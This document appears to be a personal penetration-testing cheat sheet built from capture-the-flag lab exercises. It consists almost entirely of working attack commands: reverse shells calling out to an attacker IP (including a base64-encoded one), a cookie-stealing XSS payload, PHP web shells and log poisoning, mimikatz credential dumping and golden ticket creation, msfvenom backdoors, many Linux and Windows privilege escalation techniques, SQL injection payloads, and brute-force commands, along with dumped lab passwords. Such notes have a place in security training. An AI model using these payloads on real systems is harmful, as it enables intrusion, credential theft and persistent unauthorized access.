

exploit/windows/http/icecast_header

post/multi/recon/local_exploit_suggester

getprivs

migrate -N 

load kiwi 

creds_all

golden_ticket_create

un post/windows/manage/enable_rdp

exploit/windows/http/icecast_header

exploit/multi/handler

run post/windows/gather/checkvm

run post/multi/recon/local_exploit_suggester

auxiliary/server/socks4a

run autoroute -s 172.18.1.0 -n 255.255.255.0

scp file.txt remote_username@10.10.0.2:/remote/directory

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP

smbclient //<ip>/anonymous

smbget -R smb://<ip>/anonymous

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
showmount -e MACINE_IP 

nc <IP> <port>  --- connect to proFtpd

/var

SITE CPFR /home/kenobi/.ssh/id_rsa

SITE CPTO /var/tmp/id_rsa

SITE CPFR and SITE CPTO 

mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

#find suid binary 

find -user root -perm -4000 -exec ls -ldb -type f 2>/dev/null {} \;

in tmp : echo /bin/sh > curl 
chmod 777 curl 
export PATH=/tmp:$PATH
/usr/bin/menu


---------curl -I localhost----------


CVE-2019-1388: hhupd.exe

payload delivery: exploit/multi/script/web_delivery

set powershell : PSH : target 

windows/local/persistence

run persistence -X

gtfobin ---- binary database 



--------------------


powershell -ep bypass 

. .\PowerView.ps1

Get-NetUser | select cn 
Get-NetGroup -GroupName *admin*
Get-NetComputer -fulldata | select operatingsystemm 
Invoke-ShareFinder
neo4j console
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 

Running the .json <drag and drop> in BloodHound -- check queries -- check Kerberoastable


cd Downloads && mimikaz.exe 

privilege::debug --- if Privilege '20' ok --> means user is runnig with admin priv and works properly or not
token::elevate 
lsadump::sam 
lsadump::lsa /patch --- dumping password hash NTLM 

sekurlsa::logonPasswords

hash -m 1000 <hash> <wordlists> ---- 


--------------------

running with golden tickets 

lsadump::lsa /inject /name:<user> 

Domain (....) / <id> 

RID : (....) 
User:<user> 

* Primary 
	NTLM: <hash> 

-------------------

creating golden ticket 

	kerberos::golden /user: /domain: /sid: /<user>: /id: 
	<example: kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /<user>:<hash> /id:500

---------------------

getting elevated privilege shell 

misc::cmd 

-------------

moving around power shell 

dir \\Desktop-1\c$

PsExec.exe \\Desktop-1 cmd.exe 

hostname

-------------

going into machine via 'rdp' w/remmina 

checking eventLog, user and domain admins 

-------------

Payload creation with msfvenom for persistence backdoor 

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o payload.exe

using scp to transfer payload on target

open listing port on attacking machine with multi/handler 

using persistence module to open backdoor

---------------

eternal blue --- window 7 Digi Vuln 

exploit/windows/smb/ms17_010_eternalblue

post/multi/manage/shell_to_meterpreter ---- shell to meterpreter 

migrate to root privilege process ps 

find -name user.txt


--------------

ftp <ip> 

nc <ip> port 

nc -lvnp <ip> <port> 
-------------------------------------
sudo sh -c 'cp $(which systemctl) .; chmod +s /bin/sh'

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./bin/usr/systemctl link $TF
./bin/usr/systemctl enable --now $TF

-------------------------------

ssh user@<ip> 
ssh -i id_rsa user@<ip> 

-------------------------------

ssh2joh <hash> > <john.txt> 
john -w <wordlists> john.txt -format=NT | tee john.log 

------------------------------

enum4linux
linpeas.sh 

---------------------------

http-post-form "/...../.....:username=^USER^&password=^PASS^:Invalid response" 

inspect element : run first time : get error : select POST method : click edit and edit and resend : check request at the bottom 

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.193.248 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"



-------------------

https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/
https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e


sudo -l 



------------

sudo nmap -sC -sV --script=default,vuln -p- -T5 10.10.10.86 


-------------

evil-winrm 
powershell-empire
steghide
patator 
nikto 
hash identifier 
hash -m -j <hash> 
curl 
nc 
ncat
hashcat
nc -l -p 6996 -e /bin/bash  ---->>  bindshell spwning 
nc <IP> -p 6996
nc -lvnp 6996


-------------

ExploitDB 
NVD 
CVE Mitre 

Linux_CLI --- searchsploit --- local database 

-------------

lsb_release -a  ---> check ubuntu version 

ps -p $$ ----> bash/shell current version 

---------------

# sqlite  --- >> opening 

sqlite3 <database.db> 
.tables ----> content dir and tables 

PRAGMA table_info(users);  ----> tables header

SELECT * FROM users; ----> exposed the tables and its content


------------

cross site scripting 
---
__> browser enabling -->>> about:config 
XSS enabling         -->>> browswer.url.filter >> boolean >> set to True
	             

Stored XSS
Reflected XSS
DOM-Based XSS 

Popup payload ----- <script> alert("hello") </script> 



 <html>
<head>
<script>
function newDoc() {
  window.location.assign("https://www.w3schools.com")

}
</script>
</head>
<body>

<input type="button" value="Load new document" onclick="newDoc()">

</body>
</html> 
---------------------------------------------------------
 
<head>
<script>
function newDoc() {
 alert(window.location.hostname)
}
</script>
</head>
<body>

<input type="button" value="show ip" onclick="newDoc()"></body> 
----------------------------------

<script>
function myFunction() {
  document.title = "I am a hacker";
}
</script>
<body>
<input type="button"  value="clickme" onclick=myFunction()>
</body>

</body>
-----------------------
 <script> function newDoc() {  alert(window.location.hostname) } </script> </head> <body>  <input type="button" value="show ip" onclick="newDoc()">  </body>

-------
<html>

<head>
<title>Hello this is the title</title> 
</head>

<body>
<p> And this is the paragraph </p>
<p style='margin: 0'>click to get cookies <a href="#" data-toggle="olala" data-target="#hints">clickME</a></p>
<div class="olala" id="hints">
<h6>Cookies ! </h6>
<p> This is the document cookies <code>document.cookies</code></p>
</div>

</body>

</html>
---------
<html>

<head>
<title>Hello this is the title</title> 
</head>

<body>
<p> And this is the paragraph </p>
<p> This is the document cookies <code>document.cookies</code></p>

</body>
</html>

-----------------



<body>
<p> And this is the paragraph </p>
<p style='margin: 0'>click to get cookies <a href="#" data-toggle="olala" data-target="#hints">clickME</a></p>
<div class="olala" id="hints">
<h6>Cookies ! </h6>
<p> This is the document cookies <code>document.cookies</code></p>
</div>

</body>


---------------

<script>alert(document.cookie)</script>


<script> document.title = "I am a hacker"; </script>
 <div class="popup" onclick="myFunction()">Click me!
  <span class="popuptext" id="myPopup">Popup text...</span>
</div> 

<script>
// When the user clicks on <div>, open the popup
function myFunction() {
  var popup = document.getElementById("myPopup");
  popup.classList.toggle("show");
}
</script>

----------------

<code>alert(document.title = "I am a hacker") </code>
---------------


<script>
function myFunction() {
  document.querySelector("#thm-title").textContent = "I am a hacker";
}
</script> 

<input type="button" value="clickMe" onClick=myFunction()>

---------------

<script> 
  document.querySelector("#thm-title").textContent = "I am a hacker";
</script>


-------

sqlinjection command 
-------------------- 

sqlmap -u 10.10.37.86  --data "msg=test" --method POST -p "msg" --level=3 --batch

sqlmap -u 10.10.37.86 --data "msg=test" --method POST -p "msg" --level=3 --batch --tables

sqlmap -u 10.10.37.86 --data "msg=test" --method POST -p "msg" --level=3 --batch --tables -D tests --dump-all

------------

rm /tmp/f;mkfifo /tmp/f;cat /tmp/bin/bash -c '/bin/bash -i > &/dv/tcp/10.9.116.83/4444 0>&1'>>>>> error

echo $(/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.116.83/9999 0>&1')

netcat nc reverse shell 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.116.83 9999 >/tmp/f

Encode base64: 

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.116.83 9999 >/tmp/f" | base64 -w0

Enter: 

cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuOS4xMTYuODMgOTk5OSA+L3RtcC9mCgo|base64 -d|bash

Get shell:

netstat -anlp | grep LISTEN

-----------

socat listener and exploitation 

sudo socat - TCP4:10.10.232.147:4444 --- attacker 

sudo socat TCP4-LISTEN:4444,reuseaddr EXEC:"/bin/sh" --- victim 

-------------
#getting reverse shell and it need to listene on attacking 

python3 -c 'import socket,subprocess,	os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.116.83",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

-------------

python3 -c 'import pty; pty.spawn("/bin/bash")' >> getting proper shell 

#foregrounding the shell 

stty raw -echo;fg


------------



{"company":"The Best Festival Company", "username":"santa"}


7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d0d0a


----------------


sudo sqlmap -r burp3  --tables --columns --tamper=space2comment --dbms SQLite  --dump-all --batch 

--------------

ftp getting every txt file 

mget *.txt

--------------

<script type=“text/javascript”>document.location=“http://192.168.0.48:5000/?c=“+document.cookie;</script>


--------------


ip.src == 
ip.dst ==
tcp.port == 22 / udp.port == 67
http.request.method == GET  / http.request.method == POST 
ip.addr ==
ip.addr != 
ip.addr ==  && ip.addr == 

----------------------------------
sudo tcpdump -i tun0 icmp

ss -ltn | grep -i 22

---------
whereis ----> finding binaries path 

---------

# port forwarding with chisel 
# reverse tunneling
# server side (attacker)(local) 

sudo chisel server --reverse --port 9002 


# client side (remote)(victim)

''''''''
./chisel client 10.9.116.83:9002 R:9003:172.17.0.1:22 

						or 

./chisel client 10.9.116.83:9002 R:10.9.116.83:8080:127.0.0.1:8080

''''''''

# attacker side command execution through reverse tunnel 

ssh ramsey@127.0.0.1 -p 9003 

# brute force hydra through reverse tunnel 

hydra -l ^user^ -P ^wordlist^ -s 9003 ssh://127.0.0.1 

--------------------------

sudo -u oliver /usr/bin/python /home/ramsey/vuln.py

sudo -u root PYTHONPATH=/home/oliver/evilDir /usr/bin/python /opt/dockerScript.py # need to creat malicious python code at evilDir
# __init__.py => directory 
# docker.py => directory 
--------------------------		 
# import os 		 |
# os.system('bash')      |
--------------------------

--------------------------

sending files with 									 

# sender end 
nc -w 3 <ip> 1234 < out.file
nc -w 3 10.9.116.83 1234 <  'Screenshot from 2021-10-26 15-41-08.png'




# reciever end 
nc -l -p 1234 > out.file
nc -l -p 1234 > 'Screenshot from 2021-10-26 15-41-08.png'




>>> import zlib
>>> h = open("29.zlib","r")
>>> data = h.read()
>>> zlib.decompress(data)


-----------------------
wordpress enumeration 
wpscan --url 10.10.14.4/wordpress -e u  >> e = enumerate, u = user, ap=plugin
wpscan --url 10.10.14.4/wordpress -e ap

---------------------



find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"   # finding file 

find / -perm -u=s -type f 2>/dev/null   # finding suid file


---------------------

cat /etc/crontab



--------------------
enum4linux -U <IP>   #user enumeration
enum4linux -S <IP>   #share enumeration 
enum4linux -a <iP>   # everything 

smbclient //10.10.179.49/tbfc-santa

---------------------

gpg --import somefile.key
gpg --decrypt message.gpg

---------------------

    Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
    Locating other services running or applications installed that may be abusable (SUID & out of date software)
    Looking for automated scripts like backup scripts (exploiting crontabs)
    Credentials (user accounts, application config files..)
    Mis-configured file and directory permissions

----------------------
chmod u+s /usr/bin/cp

find / -perm -u=s -type f 2>/dev/null

cp -R /root/ .  #copying whole directory

python3 -m http.server 8080

nc -l -p 1337 > LinEnum.sh
nc -w -3 10.10.119.218 1337 < LinEnum.sh


/var/log/auth.log
/var/log/syslog
/var/log/<service/"
For example, the access logs of apache2

    /var/log/apache2/access.log"

LFILE=/etc/shadow;HISTTIMEFORMAT=$'\r\e[K';history -r $LFILE;history

sudo sh -c 'cp $(which bash) .; chmod +s ./bash' ; ./bash -p

export LFILE=/etc/sudoers;bash -c 'echo "$(<$LFILE)"'


PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games=:/home/dwight/Downloads/sublime_text_3/

export PATH="/home/rageshl/dev/flutter/bin:$PATH"
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH

source ~/.bashrc
--------------------------------------------

	 # sudoers checking

# kernel version checking 

hostnamectl 
demsg | grep Linux 
uname -r 

cat /etc/*release

--------------------------

mysql service exploit local escalation 

/home/user/tools/mysql-udf #path

gcc -g -c raptor_udf2.c -fPIC

gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root #login into sql 

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

/tmp/rootbash -p

-----------------------------------

ps aux | grep mysql 

smbclient -N -L \\\\<ip>

smbclient \\\\<ip>\\<dir>

smbmap -H <ip> -R # R is recursive 

-----------------------------------

# powershell cmdlets 
# moving around the powershell 



Get-ChildItem -Filter *3* -Directory  -Hidden -Recurse  -ErrorAction SilentlyContinue
Get-Content 
Set-Location -Path C:\\\\\\
Set-String
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue 
Filter
File 
Directory 
Recure
Hidden
Path 

Select-String 2.txt -Pattern 'Red*Ryder' 

(Get-Content 1.txt)[551] 

Get-Content 1.txt | Measure-Object -Word 

Get-ChildItem -File -Hidden

Get-Help Get-Content

-----------------------------------
# Reading hash inside .txt or binary # can help to validate the 
# authentication of the file or binary like MD5 checksum

Get-FileHash -Algorithm MD5 file.txt

# String Scanning tool allowing you to view the strings inside binary
# possibly another hidden binary inside binary 

c:\Tools\strings64.exe -accepteula file.exe

# Alternate Data Stream ADS to view hidden database inside binary(.exe) 

Get-Item -Path file.exe -Stream * # viewing ADS: Alternate Data Stream

# window default cmdlet to execute the hidden binary inside binary

# Windows Management Instrumentation to launch hidden file 

# Note: give absolute path to cmd!

wmic process call create $(Resolve-Path file.exe:streamname)

wmic process call create $(Resolve-Path C:\Users\littlehelper\Documents\deebee.exe:hidedb)


------------------------------------

sudo -u root  apache2 -f /etc/shadow

------------------------------------

#preload and shared escalation

sudo -l 

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

sudo LD_PRELOAD=/tmp/preload.so program-name-here

#library manipulation 

ldd /usr/sbin/apache2 #checking library as low user
 
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

sudo LD_LIBRARY_PATH=/tmp apache2	

--------------------------------------

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

#Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

chmod +x /home/user/shell.elf

#Create these two files in /home/user:

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf


--------------------------------------

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null #suid + sgid

export TER=xMterm


stty raw -echo; fg


mysql 

mysql -uUSERNAME -p 

show DATABASE;

show tables;

SELECT  * FROM  users; 

lxc image list 

------------------

show databases;
use tron;
show tables;
SELECT * FROM users; 

# lxc lxd ---- escalation uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
-------------------------------------------------------------
#lxd_image_git
git clone  https://github.com/saghul/lxd-alpine-builder.git

#on_victim_machine_giving_lxd image to  alias name 
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage/Alpine


-------------------------------------------------------------
#checking to make sure victim recieve the lxd-image
lxc image list 


Note: hello is CONTAINER NAME 

#Giving the high privilege
lxc init Alpine hello -c security.privileged=true


#mounting lxc high privileged container on root path
lxc config device add hello DEVICENAME disk source=/ path=/mnt/root recursive=true 

#starting lxc
lxc start hello

#executing the container with root privilege 
lxc exec CONTAINERNAME /bin/sh

id

# getting into mount disk 
cd /mnt/root/root
----------------------------------------------
arp -a

------------------------------------------------
# shared object injection 
# suid

strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

./suid-so 
------------------------------------------------------------------------


#SUID / SGID Executables - Environment Variables 

/usr/local/bin/suid-env

strings /usr/local/bin/suid-env

gcc -o service /home/user/tools/suid/service.c

PATH=.:$PATH /usr/local/bin/suid-env

-----------------------------------------------------

export PATH=/home/rabbit:$PATH

-----------------------------------------------------
# SUID / SGID Executables - Abusing Shell Features (#1) 
# In Bash versions <4.2-048


user@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
user@debian:~$ function
-bash: syntax error near unexpected token `newline'
user@debian:~$ function /usr/sbin/service { /bin/bash -p; } 
user@debian:~$ export -f /usr/sbin/service 
user@debian:~$ /usr/local/bin/suid-env2
root@debian:~# 

--------------------------------------------------

#  SUID / SGID Executables - Abusing Shell Features (#2) 
# This will not work on Bash versions 4.4 

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

/tmp/rootbash -p

----------------------------------------------------

cat ~/.*history | less

---------------------------------------------------

config files 

backups incorrect permissions 

# hidden files viewing 

ls -la / 
ls -la /.ssh 

# NFS 	

# file create via NFS inherit the remote user id 

# if remote user (attacker) is root, and root squashing is enabled on victim machine, 
# the escalation will fail 
# else it will success 

# checking the squash 

cat /etc/exports

no_root_squash at /tmp 

mkdir /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/payload.elf
chmod +xs payload.elf

# need to mount on attacker side

mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
or 
mount -t nfs -o vers=3,proto=tcp,nolock,noacl,sync  10.10.247.137:/tmp /tmp/nfs

/tmp/./payload.elf 

-----------------------------------------
# Kernel exploit 
# Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

use 'Linux Exploit Suggestor 2' to detect potential kernel exploit and vul

------------------------------------------
- python3 -c "import pty;pty.spawn('/bin/bash')"
- Press 'Ctrl' + 'Z' to background the program.
- stty raw -echo
- fg
- export TERM=xterm-256color



<? system('wget http://10.9.116.83:8000/somefile.ph -O /var/www/shell.php');?>

	

Wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=admin&password=FUZZ” -u <TARGET_URL>

#log poisoning
when get access the log 
/var/log/apache2/access.log 
burp header agent --- <?php system($_GET['cmd']);?>
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']) ?> Gecko/20100101 Firefox/78.0
/var/log/apache2/access.log


php -r '$sock=fsockopen("10.9.116.83",443);exec("/bin/sh - i<&3 >&3 2>&3");'


<?php system($_GET['cmd']);?>
<?php system(/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.116.83/9999 0>&'1);?>
bash -i >& /dev/tcp/10.9.116.83/1234 0>&1'
bash+-i+>+/dev/tcp/10.9.116.83/9999+0>%261

http://10.10.87.36/admin?user=2
http://10.10.87.36/admin?user=2 order by <number>
http://10.10.87.36/admin?user=0 union select 1,2,3,4
http://10.10.87.36/admin?user=0 union select 1,database(),3,4
http://10.10.87.36/admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'
http://10.10.89.158/admin?user=0%20union%20select%201,%20group_concat(column_name),%203,4%20from%20information_schema.columns%20where%20table_name=%27users%27

10.10.89.158/admin?user=0 union select 1, group_concat(column_name), 3,4 from information_schema.columns where table_name='messages'


sudo hydra -L userlist -P /usr/share/wordlists/rockyou.txt 10.10.238.230 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"
wpscan --url <url> --enumerate u 
wpscan --url <url> -U <username> --passwords <wordlist_path>


------------------------------------------
Window PE | 
----------
Weak Reg Path
---------------

sc qc regsvc #query the service permission 

C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

#checking service permission with accesschk.exe 


reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f #overwriting the registry image path 

net start regsvc #start the exploited service 


-------------------------------------------


C:\PrivEsc\accesschk.exe /acceptula -uwdq "C:\Program Files\Unquoted Path Service\Commmon\unquotedpathservice.exe" 

C:\PrivEsc\accesschk.exe /acceptula -uwdq "C:\Program Files\Unquoted Path Service\"


-------------------------------------------
#weak file permission 
#insecure servcie executables

sc qc filepermsvc 

C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

net start filepermsvc

---------------------------------------------

xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.174.63
xfreerdp /v:10.10.212.30 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp

. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1 ////// sharing tmp files btw attacker and vm 

Invoke-Nightmare

Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n


reg query HKLM /f password /t REG_SZ /s

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

winexe -U 'admin%password' //10.10.35.109 cmd.exe

---------------------------------------------

runas /user:admin /savecred C:\PrivEsc\reverse.exe


pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip install -U


pip install pycrypto
# or
pip install pycryptodome

python get-pip.py # in tmp 

---------------------------------------------

# hashcat 	

hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt


----------------------------------------------

# pass the hash

pth-winexe -U 'admin%hash' //10.10.196.128 cmd.exe

----------------------------------------------

# scheduled tasks 

type C:\DevTools\CleanUp.ps1

C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

----------------------------------------------

# SYSTEM AND SAM 
# DUMPING HASHES and pass the hash

python2 ~/creddump7/pwdump.py SYSTEM SAM 

----------------------------------------------

# start up 

C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

cscript C:\PrivEsc\CreateShortcut.vbs

rdesktop -u admin 10.10.183.234 # starting up 

---------------------------------------------
# error error error
# triggering elevated shell with PSExec64.exe 

sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.183.234:9999

sudo nc -lvnp 443

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

--------------------------
# Rotten Potato Exploit
# RoguePotato exploit
# only on admin shell 

C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999

sudo nc -lvnp 443
---------------------------------------------

sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.183.234:9999 #redirector on kali

# login with admin and exec cmd.exe with admin privi

listen on kali with 'sudo nc -lvnp 443'

# then execute following on remote admin shell 

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

---------------------------------------------
# token impersonation 	
# printer spoofer double exploitation with PSExec64.exe 
# Note : using two stages reverse shell - one for local service account and other for system account
# local admin user account > local service account  > NT system account 


C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse2.exe" -i

---------------------------------------------

# Window Potential PE Finder Tools 

winPEASany.exe

Seatbelt.exe

PowerUp.ps1

SharpUp.exe

# tools 

-a----        2/22/2020   9:38 PM         222592 accesschk.exe
-a----         6/5/2020   8:32 AM            959 AdminPaint.lnk
-a----        2/22/2020   9:38 PM            232 CreateShortcut.vbs
-a----         6/5/2020   8:32 AM            990 lpe.bat
-a----        2/22/2020   9:38 PM         678312 plink.exe
-a----        2/22/2020   9:38 PM         494860 PowerUp.ps1
-a----         6/5/2020   9:06 AM          27136 PrintSpoofer.exe
-a----        2/22/2020   9:38 PM        1258824 Procmon64.exe
-a----        2/22/2020   9:38 PM         374944 PsExec64.exe
-a----        1/12/2021   7:57 PM           7168 reverse.exe
-a----        1/15/2021  10:47 AM           7168 reverse2.exe
-a----        5/11/2020   9:23 AM         159232 RoguePotato.exe
-a----         6/5/2020   8:32 AM            221 savecred.bat
-a----        2/22/2020   9:38 PM         160768 Seatbelt.exe
-a----        2/22/2020   9:38 PM          26112 SharpUp.exe
-a----         3/6/2020   7:00 PM         229376 winPEASany.exe


    Directory: C:\DevTools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/5/2020   8:32 AM            173 CleanUp.ps1
--------------------------------------------
# attacker-kali to window-vic files copying with smbserver 

locate smbserver.py 
python3 /path/to/smbserver.py kali . 
copy //ip/kali/exe C:\Dir\

--------------------------------------------

mkpasswd -m sha-512 newpasswordhere

--------------------------------------------
ruby interactive shell (irb) 

Dir.pwd 
Dir.chdir('/home/user') 
Dir.entries('.')
file = File.read('flag.txt')
file = File.open('flag.txt', 'r') 
file = FIle.open('flag.txt', 'w')

# Dangerous PATH 

But it doesn’t use full path for cp command. So, we can create our own binary named cp

----------------------------------------------------------------------------------------


# SQL injection UPDATE STATEMENT Injection 


# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='


',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='

',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='

', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -

 	CREATE TABLE secrets ( id integer primary key, author integer not null, secret text not null )


',nickName=(SELECT group_concat(secret || ":") from secrets),email='




 1' UNION SELECT NULL-- -
 1' UNION SELECT NULL, NULL-- -
 1' UNION SELECT NULL, NULL, NULL-- -


' UNION SELECT 1, password from users-- -
' UNION SELECT 1,group_concat(password) FROM users-- -

' UNION SELECT 1,group_concat(password) FROM users-- -

--------------------------------------------------------------------------------------------------------

# sqli important

#list table 
1' UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -

#enumrate the table get the column 
1' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -

#dump the data of columns from the table
1' UNION SELECT 1,group_concat(username || "," || password || ":") from users-- -

---------------------------------------------------------------------------------------------------------

Logged in as CREATE TABLE users ( id integer primary key, username text unique not null, password text not null ) |
Logged in as admin,rcLYWHCxeGUsA9tH3GNV:,dev,asd:,amanda,Summer2019!:,maja,345m3io4hj3:,awe32Flage32x,THM{fb381dfee71ef9c31b93625ad540c9fa}:,emil,viking123: | 

---------------------

Blind injection



-------------------------------------------------------------------------------
-- Changing start
SUBSTR("THM{Blind}", 1,1) = T
SUBSTR("THM{Blind}", 2,1) = H
SUBSTR("THM{Blind}", 3,1) = M

-- Changing length
SUBSTR("THM{Blind}", 1,3) = THM

#SUBSTR( string, <start>, <length>)

-------------------------------------------------------------------------------

sqlite> SELECT password FROM users LIMIT 0,1
THM{Blind}
sqlite> SELECT password FROM users LIMIT 1,1
Summer2019!
sqlite> SELECT password FROM users LIMIT 0,2
THM{Blind}
Summer2019!

	
THM{Blind}
Summer2019!
Viking123

LIMIT <OFFSET>, <LIMIT>

-------------------------------------------------------------------------------

admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -

$ sqlmap -u http://10.10.216.72:5000/challenge3/login --data="username=admin&password=admin" 
--level=5 --risk=3 --dbms=sqlite --technique=b --dump

# password length finding

admin' AND length((SELECT password from users where username='admin'))==37-- -


sqlmap --tamper notes.py --url http://10.10.216.72:5000/challenge4/signup  --data "username=admin&password=asd" --second-url http://10.10.216.72:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast



sqlmap --tamper notes.py --url http://10.10.216.72:5000/challenge4/signup --data "username=admin&password=asd" 
--second-url http://10.10.216.72:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump




') UNION SELECT 1,2,3,sqlite_version();-- - 

' UNION SELECT '1'' UNION SELECT 1,2,3,sqlite_version();   -- -  #escaping the single quote with single quote 
																	#two stages injection 


' UNION SELECT '1'' UNION SELECT 1,2,3,tbl_name FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"   -- -					
' UNION SELECT '1'' UNION SELECT 1,2,3,tbl_name FROM sqlite_master WHERE type="table" and tbl_name NOT like "sqlite_%"   -- -


 ' UNION SELECT '1'' UNION SELECT 1,2,3,group_concat(username || "," || password || ":") from users -- -

------------------------------------------------------------------------
' UNION SELECT '3' -- - 

Query 1:
